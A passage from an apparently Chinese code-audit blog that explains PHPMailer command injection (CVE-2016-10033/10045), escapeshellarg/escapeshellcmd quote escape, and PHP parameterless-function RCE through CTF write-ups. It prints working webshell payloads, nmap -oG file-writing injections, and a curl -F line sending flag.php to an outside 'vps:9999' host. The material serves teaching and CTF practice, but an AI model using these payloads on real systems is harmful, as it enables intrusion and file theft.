$options);?&gt; 上面这个样例中，我们使用 -X 参数指定日志文件，最终会在 /var/www/html/rce.php 中写入如下数据：运行之后会生成一个rce.php的日志文件，查看其内容： 漏洞二 但是我们还可以在$to这个字段注入命令，关于这个字段一共有三层过滤。 第一层：filter_var 1filter_var($email, FILTER_VALIDATE_EMAIL) P牛的一篇文章也提到了怎么绕过FILTER_VALIDATE_EMAIL：https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html 这里就用几个demo演示一下方便理解： 12345678910111213141516171819&lt;?php$email1 = &#x27;12 3@test.com&#x27;;echo $email1;var_dump(filter_var($email1, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email2 = &#x27;12\\ 3@test.com&#x27;;echo $email2;var_dump(filter_var($email2, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email3 = &#x27;&quot;12\\ 3&quot;@test.com&#x27;;echo $email3;var_dump(filter_var($email3, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email4 = &#x27;&quot;123\\&quot;\\&#x27;&quot;@test.com&#x27;;echo $email4;var_dump(filter_var($email4, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email5 = &#x27;\\&#x27;.&quot;123&quot;@test.com&#x27;;echo $email5;var_dump(filter_var($email5, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;;$email6 = &#x27;\\&quot;.&quot;123&quot;@test.com&#x27;;echo $email6;var_dump(filter_var($email6, FILTER_VALIDATE_EMAIL)).&quot;\\n&quot;; 测试结果如下： 12345612 3@test.combool(false)12\\ 3@test.combool(false)&quot;12\\ 3&quot;@test.comstring(16) &quot;&quot;12\\ 3&quot;@test.com&quot;&quot;123\\&quot;&#39;&quot;@test.comstring(17) &quot;&quot;123\\&quot;&#39;&quot;@test.com&quot;&#39;.&quot;123&quot;@test.comstring(16) &quot;&#39;.&quot;123&quot;@test.com&quot;\\&quot;.&quot;123&quot;@test.combool(false) 第二层：escapeshellarg 官方文档： escapeshellarg —— 把字符串转码为可以在 shell 命令里使用的参数 功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号) demo1： 1234567&lt;?php$a = &#x27;123&#x27;;$b=escapeshellarg($a);echo &quot;old: &quot;.$a.&quot;\\n&quot;;echo &quot;now: &quot;.$b;?&gt;//old: 123 now: &#x27;123&#x27; 两边加上单引号 demo2： 1234567&lt;?php$a = &quot;12&#x27;3&quot;;$b=escapeshellarg($a);echo &quot;old: &quot;.$a.&quot;\\t\\t&quot;;echo &quot;now: &quot;.$b;?&gt;//old: 12&#x27;3 now: &#x27;12&#x27;\\&#x27;&#x27;3&#x27; 单引号被转义，两边均加上单引号 第三层：escapeshellcmd PHP的 mail() 函数在底层实现中，调用了 escapeshellcmd() 函数，官方文档： escapeshellcmd() —— 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\\）会在以下字符之前插入： *&amp;#;`|*?~&lt;&gt;^()[]{}$*, \\x0A 和 \\xFF。 ’ 和 &quot; 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 demo1： 1234567&lt;?php$a = &#x27;12&quot;3&#x27;;$b=escapeshellcmd($a);echo &quot;old: &quot;.$a.&quot;\\t\\t&quot;;echo &quot;now: &quot;.$b;?&gt;// old: 12&quot;3 now: 12\\&quot;3 demo2： 1234567&lt;?php$a = &#x27;12&quot;3&quot;&#x27;;$b=escapeshellcmd($a);echo &quot;old: &quot;.$a.&quot;\\t\\t&quot;;echo &quot;now: &quot;.$b;?&gt;//old: 12&quot;3&quot; now: 12&quot;3&quot; 注意 &#x27; 和 &quot; 仅在不配对儿的时候被转义 那我们前面说过了PHP的 mail() 函数在底层调用了 escapeshellcmd() 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过 filter_var() 的检测，但还是会被 escapeshellcmd() 处理。然而 escapeshellcmd() 和 escapeshellarg 一起使用，会造成特殊字符逃逸，下面通过一个简单例子理解一下： 12345678910&lt;?php $param=&quot;127.0.0.1&#x27; -v -d a=1&quot;; $a=escapeshellarg($param); $b=escapeshellcmd($a); $cmd=&quot;curl &quot;.$b; var_dump($a).&#x27;\\n&#x27;; var_dump($b).&#x27;\\n&#x27;; var_dump($cmd).&#x27;\\n&#x27;; system($cmd);?&gt; 详细分析一下这个过程： 传入的参数是 1127.0.0.1&#39; -v -d a&#x3D;1 由于escapeshellarg先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下： 1&#39;127.0.0.1&#39;\\&#39;&#39; -v -d a&#x3D;1&#39; 接着 escapeshellcmd 函数对第二步处理后字符串中的 \\ 以及 a=1' 中的单引号进行转义处理，结果如下所示： 1&#39;127.0.0.1&#39;\\\\&#39;&#39; -v -d a&#x3D;1\\&#39; 由于第三步处理之后的payload中的 \\\\ 被解释成了 \\ 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示： 0x02 实例分析 这里实例分析选择 PHPMailer 命令执行漏洞 （ CVE-2016-10045 和 CVE-2016-10033 ）。 CVE-2016-10033 又是P牛的文章：https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html Seebug：https://paper.seebug.org/161/ 环境搭建 Dockerfile： 12345FROM php:5.6-apacheRUN apt-get update &amp;&amp; apt-get install -y sendmailRUN echo &#x27;sendmail_path = &quot;/usr/sbin/sendmail -t -i&quot;&#x27; &gt; /usr/local/etc/php/php.ini 提前下载好源码，在源码根目录下添加测试文件 1.php： 123456789101112&lt;?phprequire(&#x27;PHPMailerAutoload.php&#x27;);$mail = new PHPMailer;$mail-&gt;setFrom($_GET[&#x27;x&#x27;], &#x27;Vuln Server&#x27;);$mail-&gt;Subject = &#x27;subject&#x27;;$mail-&gt;addAddress(&#x27;c@d.com&#x27;, &#x27;attacker&#x27;);$mail-&gt;msgHTML(&#x27;test&#x27;);$mail-&gt;AltBody = &#x27;Body&#x27;;$mail-&gt;send();?&gt; shell： 12docker build -t cve-2016-10033 .docker run --rm --name vuln-phpmail -p 8080:80 -v &#x2F;home&#x2F;ca01h&#x2F;phpmail&#x2F;deploy&#x2F;PHPMailer-5.2.17:&#x2F;var&#x2F;www&#x2F;html cve-2016-10033 漏洞原理 漏洞具体位置在 class.phpmailer.php 中： 123456789101112private function mailPassthru($to, $subject, $body, $header, $params)&#123; //Can&#x27;t use additional_parameters in safe_mode //@link http://php.net/manual/en/function.mail.php if (ini_get(&#x27;safe_mode&#x27;) or !$this-&gt;UseSendmailOptions or is_null($params)) &#123; $result = @mail($to, $subject, $body, $header); &#125; else &#123; $result = @mail($to, $subject, $body, $header, $params); &#125; return $result; &#125; 这里$param作为mail的第五个参数，该参数用于指定sendmail的额外参数，其中sendmail的-X参数会将流量记录到文件中从而写文件实现 RCE，进一步跟跟进 $params 参数，看看它是怎么来的。 1234567891011121314151617181920212223242526272829303132333435protected function mailSend($header, $body) &#123; $toArr = array(); foreach ($this-&gt;to as $toaddr) &#123; $toArr[] = $this-&gt;addrFormat($toaddr); &#125; $to = implode(&#x27;, &#x27;, $toArr); $params = null; //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver if (!empty($this-&gt;Sender)) &#123; $params = sprintf(&#x27;-f%s&#x27;, $this-&gt;Sender); &#125; if ($this-&gt;Sender != &#x27;&#x27; and !ini_get(&#x27;safe_mode&#x27;)) &#123; $old_from = ini_get(&#x27;sendmail_from&#x27;); ini_set(&#x27;sendmail_from&#x27;, $this-&gt;Sender); &#125; $result = false; if ($this-&gt;SingleTo and count($toArr) &gt; 1) &#123; foreach ($toArr as $toAddr) &#123; $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; &#125; else &#123; $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; if (isset($old_from)) &#123; ini_set(&#x27;sendmail_from&#x27;, $old_from); &#125; if (!$result) &#123; throw new phpmailerException($this-&gt;lang(&#x27;instantiate&#x27;), self::STOP_CRITICAL); &#125; return true; &#125; 重点关注第12行，很明显 $params 是从 $this-&gt;Sender 传进来的，我们找一下 $this-&gt;Sender。 12345678910111213141516171819202122232425public function setFrom($address, $name = &#x27;&#x27;, $auto = true) &#123; $address = trim($address); $name = trim(preg_replace(&#x27;/[\\r\\n]+/&#x27;, &#x27;&#x27;, $name)); //Strip breaks and trim // Don&#x27;t validate now addresses with IDN. Will be done in send(). if (($pos = strrpos($address, &#x27;@&#x27;)) === false or (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and !$this-&gt;validateAddress($address)) &#123; $error_message = $this-&gt;lang(&#x27;invalid_address&#x27;) . &quot; (setFrom) $address&quot;; $this-&gt;setError($error_message); $this-&gt;edebug($error_message); if ($this-&gt;exceptions) &#123; throw new phpmailerException($error_message); &#125; return false; &#125; $this-&gt;From = $address; $this-&gt;FromName = $name; if ($auto) &#123; if (empty($this-&gt;Sender)) &#123; $this-&gt;Sender = $address; &#125; &#125; return true; &#125; 将 $address 经过某些处理之后赋值给 $this-&gt;Sender，继续追踪validateAddress函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public static function validateAddress($address, $patternselect = null) &#123; if (is_null($patternselect)) &#123; $patternselect = self::$validator; &#125; if (is_callable($patternselect)) &#123; return call_user_func($patternselect, $address); &#125; //Reject line breaks in addresses; it&#x27;s valid RFC5322, but not RFC5321 if (strpos($address, &quot;\\n&quot;) !== false or strpos($address, &quot;\\r&quot;) !== false) &#123; return false; &#125; if (!$patternselect or $patternselect == &#x27;auto&#x27;) &#123; //Check this constant first so it works when extension_loaded() is disabled by safe mode //Constant was added in PHP 5.2.4 if (defined(&#x27;PCRE_VERSION&#x27;)) &#123; //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2 if (version_compare(PCRE_VERSION, &#x27;8.0.3&#x27;) &gt;= 0) &#123; $patternselect = &#x27;pcre8&#x27;; &#125; else &#123; $patternselect = &#x27;pcre&#x27;; &#125; &#125; elseif (function_exists(&#x27;extension_loaded&#x27;) and extension_loaded(&#x27;pcre&#x27;)) &#123; //Fall back to older PCRE $patternselect = &#x27;pcre&#x27;; &#125; else &#123; //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension if (version_compare(PHP_VERSION, &#x27;5.2.0&#x27;) &gt;= 0) &#123; $patternselect = &#x27;php&#x27;; &#125; else &#123; $patternselect = &#x27;noregex&#x27;; &#125; &#125; &#125; switch ($patternselect) &#123; case &#x27;pcre8&#x27;: ...... case &#x27;pcre&#x27;: ...... case &#x27;html5&#x27;: ...... case &#x27;noregex&#x27;: //No PCRE! Do something _very_ approximate! //Check the address is 3 chars or longer and contains an @ that&#x27;s not the first or last char return (strlen($address) &gt;= 3 and strpos($address, &#x27;@&#x27;) &gt;= 1 and strpos($address, &#x27;@&#x27;) != strlen($address) - 1); case &#x27;php&#x27;: default: return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL); &#125; &#125; 这个函数的大概流程就是： 默认patternselect==‘auto’，它会自动选择一个方式对email进行检测 如果php支持正则PCRE（也就是包含preg_replace函数），就用正则的方式来检查，就是那一大串很难读懂的正则 如果php不支持PCRE，且PHP版本大于PHP5.2.0，就是用PHP自带的filter来检查email 如果php不支持PCRE，且PHP版本低于PHP5.2.0，就直接检查email中是否包含@ 如果是第四种情况的话，这个时候该函数会使用noregex的方式，即只需满足三个条件即可通过过滤： 输入长度大于 3 含有@ @不是最后一个字符 这三个条件比较容易满足，也有复现环境和Poc：https://github.com/opsxcq/exploit-CVE-2016-10033 但是满足这个情况的主机现在已经很少了，正常情况下都是使用pcre8的正则来进行过滤，所以如果要扩大攻击面需要对正则进行绕过，并且还得让 sendmail 成功执行。 有几种payload可以绕过那些看着头大的正则表达式： 正则表达式分析： https://www.leavesongs.com/PENETRATION/how-to-analyze-long-regex.html 1&quot;&lt;?system($_GET[&#39;pew&#39;]);?&gt;&quot;. -OQueueDirectory&#x3D;&#x2F;tmp&#x2F;. -X.&#x2F;images&#x2F;zwned.php @swehack.org 这里使用.%20（点+空格）来作为分隔符，实际测试一下，已经写入了shell.php 访问： 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;1.php?x&#x3D;%22%3C?system($_GET[%27x%27]);?%3E%22.%20-OQueueDirectory&#x3D;&#x2F;tmp&#x2F;.%20-X&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php%20@a.com P牛的payload： 1aaa( -X&#x2F;home&#x2F;www&#x2F;success.php -OQueueDirectory&#x3D;&#x2F;tmp )@qq.com CVE-2016-10045 Seebug文章：https://paper.seebug.org/164/ 环境搭建 和上面的一样，就是把源代码换成5.2.20版本 漏洞原理 首先看补丁： 针对用户输入使用 escapeshellarg 函数进行处理。所以，在最新版本中使用之前的 payload 进行攻击会失败，例如： 1a( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com 但是，却可以使用下面这个 payload 进行攻击： 1a&#39;( -OQueueDirectory&#x3D;&#x2F;tmp -X&#x2F;var&#x2F;www&#x2F;html&#x2F;x.php )@a.com 实际上，可用于攻击的代码只是在之前的基础上多了一个单引号。之所以这次的攻击代码能够成功，是因为修复代码多了 escapeshellcmd 函数，结合上 mail() 函数底层调用的 escapeshellarg 函数，最终导致单引号逃逸。 1234567&lt;?php$payload = &quot;a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/shell.php )@qq.com&quot;;$earg = escapeshellarg($payload);var_dump($earg);$ecmd = escapeshellcmd($earg);var_dump($ecmd);?&gt; 我们的 payload 最终在执行时变成了'-fa'\\\\''\\( -OQueueDirectory=/tmp -X/var/www/html/test.php \\)@a.com\\'，分割后就是-fa\\(、-OQueueDirectory=/tmp、-X/var/www/html/test.php、)@a.com'，最终的参数就是这样被注入的。 0x03 练习题 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phphighlight_file(&#x27;index.php&#x27;);function waf($a)&#123; foreach($a as $key =&gt; $value)&#123; if(preg_match(&#x27;/flag/i&#x27;,$key))&#123; exit(&#x27;are you a hacker&#x27;); &#125; &#125;&#125;foreach(array(&#x27;_POST&#x27;, &#x27;_GET&#x27;, &#x27;_COOKIE&#x27;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125;if($_POST) &#123; waf($_POST);&#125;if($_GET) &#123; waf($_GET); &#125;if($_COOKIE) &#123; waf($_COOKIE);&#125;if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP);if(isset($_GET[&#x27;flag&#x27;]))&#123; if($_GET[&#x27;flag&#x27;] === $_GET[&#x27;hongri&#x27;])&#123; exit(&#x27;error&#x27;); &#125; if(md5($_GET[&#x27;flag&#x27;] ) == md5($_GET[&#x27;hongri&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; $urlInfo = parse_url($url); if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;])))&#123; die( &quot;scheme error!&quot;); &#125; $url = escapeshellarg($url); $url = escapeshellcmd($url); system(&quot;curl &quot;.$url); &#125;&#125;?&gt; 1234// flag.php&lt;?php$flag = &quot;HRCTF&#123;Are_y0u_maz1ng&#125;&quot;;?&gt; 考点一 这里涉及到可变变量的概念 1234567foreach(array(&#x27;_POST&#x27;, &#x27;_GET&#x27;, &#x27;_COOKIE&#x27;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125;&#125; 首先循环获取超全局变量_POST、_GET、_COOKIE，并依次赋值给$__R。再第二行判断$$__R是否存在，如果存在的话，那么继续判断_POST、_GET、_COOKIE中是否存在键值相等的，如果相等则删除变量。 假如我们通过GET提交flag=ca01h，接着通过POST提交_GET[flag]=ca01h。那么遍历$_POST 超全局数组的时候，$__key就等于_GET[flag]，$__v就等于ca01h，所以$$__key等于$_GET[flag]，即ca01h，此时$$__k==$__v成立，变量$_GET[flag]就被释放了。接着如果这些超全局变量存在的话，对它们的键名进行一个waf过滤，但是在 第21行 和 22行 有这样一串代码： 12if($_POST) extract($_POST, EXTR_SKIP);if($_GET) extract($_GET, EXTR_SKIP); extract是变量覆盖常用的函数，作用是将对象内的键名变成一个变量名，而这个变量对应的值就是这个键名的值，EXTR_SKIP 参数表示如果前面存在此变量，不对前面的变量进行覆盖处理。由于我们前面通过 POST 请求提交 _GET[flag]=test ，所以这里会变成 $_GET[flag]=test ，这里的$_GET变量就不需要再经过 waf 函数检测了，也就绕过了preg_match(‘/flag/i’,$key)的限制。 考点二 123456789101112131415if(isset($_GET[&#x27;flag&#x27;]))&#123; if($_GET[&#x27;flag&#x27;] === $_GET[&#x27;hongri&#x27;])&#123; exit(&#x27;error&#x27;); &#125; if(md5($_GET[&#x27;flag&#x27;] ) == md5($_GET[&#x27;hongri&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; $urlInfo = parse_url($url); if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;])))&#123; die( &quot;scheme error!&quot;); &#125; $url = escapeshellarg($url); $url = escapeshellcmd($url); system(&quot;curl &quot;.$url); &#125;&#125; 第二行和第五行的两个if语句用md5碰撞就可以绕过，接下来主要考察curl读取文件。 在 curl 中存在 -F 提交表单的方法，可以提交文件。 -F &lt;key=value&gt; 向服务器POST表单，例如： curl -F “web=@index.html;type=text/html” url.com 。提交文件之后，利用代理的方式进行监听，这样就可以截获到文件了,同时还不受最后的的影响。 这里的 第11行 和 第12行 增加了两个过滤，参照上面的知识点绕过。 所以这题最后的 payload ： 1&#x2F;index.php?flag&#x3D;QNKCDZO&amp;hongri&#x3D;s878926199a&amp;url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x vps:9999 POST： 1_GET[flag]&#x3D;QNKCDZO&amp;_GET[hongri]&#x3D;s878926199a&amp;_GET[url]&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;&#39; -F file&#x3D;@&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php -x vps:9999 0x04 附加练习题 题目地址：[BUU2018 Online Tool](https://buuoj.cn/challenges#[BUUCTF 2018]Online Tool) 源码： 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];&#125;if(!isset($_GET[&#x27;host&#x27;])) &#123; highlight_file(__FILE__);&#125; else &#123; $host = $_GET[&#x27;host&#x27;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &#x27;you are in sandbox &#x27;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);&#125; 最后一行代码是执行一个系统命令，而且有传参，肯定是利用这里了。这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，escapeshellcmd会对这些特殊符号前面加上\\来转义。 那么就应该想想怎么利用nmap来做些什么。 nmap命令中 有一个参数-oG或者-oN可以实现将命令和结果写到文件 接下来考虑两个函数的效果，测试代码： 12345678910111213&lt;?php$host = &quot;&#x27; &lt;?php phpinfo;?&gt; -oG shell.php &#x27;&quot;;$host = (string)$host;echo &quot;host:&quot;.$host;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$arg = escapeshellarg($host);echo &quot;arg:&quot;.$arg;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;$cmd = escapeshellcmd($arg);echo &quot;cmd:&quot;.$cmd;echo &quot;&lt;/br&gt;&quot;.&quot;\\n&quot;;echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);?&gt; 输出\\： 123host:&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;&lt;&#x2F;br&gt;arg:&#39;&#39;\\&#39;&#39; &lt;?php phpinfo;?&gt; -oG shell.php &#39;\\&#39;&#39;&#39;&lt;&#x2F;br&gt;cmd:&#39;&#39;\\\\&#39;&#39; \\&lt;\\?php phpinfo\\;\\?\\&gt; -oG shell.php &#39;\\\\&#39;&#39;&#39;&lt;&#x2F;br&gt; escapeshellarg会先对单引号转义，此时的结果应该是这样的： 1\\&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php \\&#39; 然后对\\分割的每个部分加上单引号，并连接，结果如下： 1&#39;&#39;\\&#39;&#39;-oG &lt;?php phpinfo();?&gt; -oG shell.php &#39;\\&#39;&#39;&#39; 之后，进行了escapeshellcmd，会对上边提到的字符进行转义： 1&#39;&#39;\\\\&#39;&#39;\\&lt;\\?php phpinfo\\(\\)\\;\\?\\&gt; -oG shell.php &#39;\\\\&#39;&#39;&#39; 带入到命令行执行的结果就是： 1\\ &lt;?php phpinfo();?&gt; -oG shell.php \\\\ payload： 1?host&#x3D;&#39; &lt;?php phpinfo();?&gt; -oG shell.php &#39; 读取flag： 1?host&#x3D;&#39; &lt;?php echo &#96;cat &#x2F;flag&#96;;?&gt; -oG mmm.php &#39;","tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"PHP","slug":"代码审计/PHP","permalink":"http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"}]},{"title":"从一道题学习PHP无参数函数的利用","date":"2020-06-15T03:32:53.000Z","path":"Web_security/php_related/9.从一道题学习PHP无参数函数的利用/","text":"从ByteCTF boringcode 学习PHP无参数函数的利用 0x01 题目源码 题目环境：https://github.com/CTFTraining/bytectf_2019_web_boring_code 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction is_valid_url($url) &#123; if (filter_var($url, FILTER_VALIDATE_URL)) &#123; if (preg_match(&#x27;/data:\\/\\//i&#x27;, $url)) &#123; return false; &#125; return true; &#125; return false;&#125;if (isset($_POST[&#x27;url&#x27;]))&#123; $url = $_POST[&#x27;url&#x27;]; if (is_valid_url($url)) &#123; $r = parse_url($url); if (preg_match(&#x27;/baidu\\.com$/&#x27;, $r[&#x27;host&#x27;])) &#123; $code = file_get_contents($url); if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z]+\\((?R)?\\)/&#x27;, NULL, $code)) &#123; if (preg_match(&#x27;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code)) &#123; echo &#x27;bye~&#x27;; &#125; else &#123; eval($code); &#125; &#125; &#125; else &#123; echo &quot;error: host not allowed&quot;; &#125; &#125; else &#123; echo &quot;error: invalid url&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 简单分析一下，这个页面的作用是，接受一个url参数，利用file_get_content远程获取url页面的源码，传递给eval执行。但在url传递和源码传递过程中有各种检测。 0x02 考点一 is_valid_url()函数来检测url的正确性，并禁止使用data协议。 url的host必须以baidu.com结尾。 这里如果没有is_valid_url()是可以使用data伪协议绕过域名的限制，如下面的例子所示： PHP.ini： data://协议必须双在on才能正常使用； allow_url_fopen ：on allow_url_include：on php 版本大于等于 php5.2 12345678&lt;?php$url = $_POST[&#x27;url&#x27;];$r = parse_url($url);if (preg_match(&#x27;/baidu\\.com$/&#x27;, $r[&#x27;host&#x27;]))&#123; $code = file_get_contents($url);&#125;eval($code); 这里把data协议禁止了之后，想要利用伪协议绕过的话近乎无解。 但是还是有很多骚操作，这篇文章主要讲下面的知识，至于怎么绕过我就直接放一个链接：https://www.guildhab.top/?p=1077 0x02 考点二 由preg_replace('/[a-z]+\\((?R)?\\)/'可知，这里只允许无参数的函数传递进来。并且函数名只能为字母，不能包含下划线等其他特殊字符。 过滤了很多的关键字：et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log 也就是说我们传入的值必须是一个只含字母并且没有参数的函数的payload.同时可以注意到这个是可以进行一个函数的套用。所以我们的目标是构造多个空参数的函数去读取flag。 首先看scandir()函数： scandir('.')能够返回当前目录的文件列表的数组，那么怎么取出文件名和读取文件呢，可以使用end()和readfile()： 但是还需要构造函数scandir('.')中的参数.，这里有一个localeconv()函数： 其中数组的第一个元素就是.，而与end()相反的取第一个元素的函数有： 因为这里还过滤en，所以就选择了后者。那么就可以构造如下payload可以读取到文件本地文件： 1readfile(end(scandir(pos(localeconv())))) 但是flag并不在本文件夹下，那么就需要用到改变当前目录的函数：chdir() 函数可以改变当前的目录，此外还需要借助next()函数将内部指针指向数组中的下一个元素，并输出。 这里可以获取到scandir()返回的..。 但是chdir()函数并不会返回一个目录列表，而是一个Bool值，这里有两种办法： 第一种办法是使用if语句，也就是当跳转目录成功时候就读取当前文件。构造如下payload： 1if(chdir(next(scandir(pos(localeconv())))))readfile(end(scandir(pos(localeconv())))) 第二种方法是使用localtime()配合chr 获取.的payload：chr(pos(localtime())) 当时间为某一分钟的46秒时，pos(localtime())返回46，而且46是.的ASCII码值，所以payload就会返回.。 但是localtime第一个参数是接收一个时间戳，所以这里需要使用time()来解决。time()不会受参数的影响并且会返回一个时间戳。 所以我们的payload就是： 1readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))); 其中chdir(next(scandir(pos(localeconv()))))更换当前路径，scandir(chr(pos(localtime(time))))列出更改路径后的当前目录结构。 0x04 无参数函数小结 Sky师傅的文章已经说的很清楚了，这里就做一个小结。 12345&lt;?phpif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_POST[&#x27;code&#x27;])) &#123; eval($_POST[&#x27;code&#x27;]);&#125;?&gt; 这个正则表达式和上面的区别在于这里还可以运行函数名称包含_等特殊字符。 getenv()获取环境变量 版本要求PHP &gt; 7.1 使用getenv()获取超全局变量的数组，使用array_rand和array_flip爆破出所有的全局变量。 getallheaders() 12getallheaders() 获取全部 HTTP 请求头信息, 是下面函数的别名apache_request_headers 获取全部 HTTP 请求头信息 这两个函数只适用于apache服务器 添加一个Header为ca01h: phpinfo();,根据位置选择合适的payload： 添加在Header在第一个： payload: code=eval(pos(getallheaders())); (pos()可以换为current(). 如果在第二个可以使用next()) 添加在Header在最后一个： payload: code=eval(end(getallheaders())); 不知道位置： 配合array_rand(), array_flip()构造payload进行爆破： payload: eval(array_rand(array_flip(getallheaders()))); get_defined_vars() 1get_defined_vars() 函数返回由所有已定义变量所组成的数组。 和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用 函数返回的内容： 12345678910111213141516array(4) &#123; [&quot;_GET&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_POST&quot;]&#x3D;&gt; array(1) &#123; [&quot;code&quot;]&#x3D;&gt; string(29) &quot;var_dump(get_defined_vars());&quot; &#125; [&quot;_COOKIE&quot;]&#x3D;&gt; array(0) &#123; &#125; [&quot;_FILES&quot;]&#x3D;&gt; array(0) &#123; &#125;&#125; 利用$_GET url：http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo(); post：code=eval(end(current(get_defined_vars()))); 利用$_FILE 12345678910import requestsfiles = &#123; &quot;system(&#x27;ping 127.0.0.1&#x27;);&quot;: &quot;&quot;&#125;data = &#123;&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;&#125;r = requests.post(&#x27;http://127.0.0.1/ctf/boringcode/rce.php&#x27;, data=data, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;)) 直接把payload放在文件名上，然后用两次pos定位进行利用。 0x05 总结 123456789101112131415161718getchwd() 函数返回当前工作目录。scandir() 函数返回指定目录中的文件和目录的数组。dirname() 函数返回路径中的目录部分。chdir() 函数改变当前的目录。readfile() 输出一个文件current() 返回数组中的当前单元, 默认取第一个值pos() current() 的别名next() 函数将内部指针指向数组中的下一个元素，并输出。end() 将内部指针指向数组中的最后一个元素，并输出。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() array_flip() 函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。chr() 函数从指定的 ASCII 值返回字符。hex2bin — 转换十六进制字符串为二进制字符串getenv() 获取一个环境变量的值(在7.1之后可以不给予参数) 0x06 Reference Topic URL ByteCTF一道题的分析与学习PHP无参数函数的利用 https://threezh1.com/2019/09/15/boringcode/#get-defined-vars-gt-RCE 复现ByteCTF-boringcode https://www.plasf.cn/2019/10/07/ByteCTF-WEB复现/ PHP Parametric Function RCE https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#前言 0x07 Update 2020.06.19 如何利用无参数函数跳转到根目录，假设当前目录是/var/www/html： 